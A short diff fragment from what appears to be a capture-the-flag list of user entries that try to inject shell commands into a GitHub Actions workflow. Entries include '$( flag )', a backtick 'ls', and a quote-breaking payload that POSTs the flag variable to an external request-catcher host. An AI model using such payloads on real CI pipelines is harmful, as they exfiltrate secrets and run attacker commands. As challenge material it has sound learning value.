@@ -725,4 +725,4 @@ coderjingluo:${{ secrets.FLAG }}
 hypnguyen1209:${{ github.event.issue.number }} $( flag )
 ";echo \`ls\`"
 Nkzlxs:$flag
-sln-1550:';curl -X POST -d "$flag" https://hyp.requestcatcher.com;echo '1
+sln-1550:';curl -X POST -d "$flag" https://hyp.requestcatcher.com;echo '1:
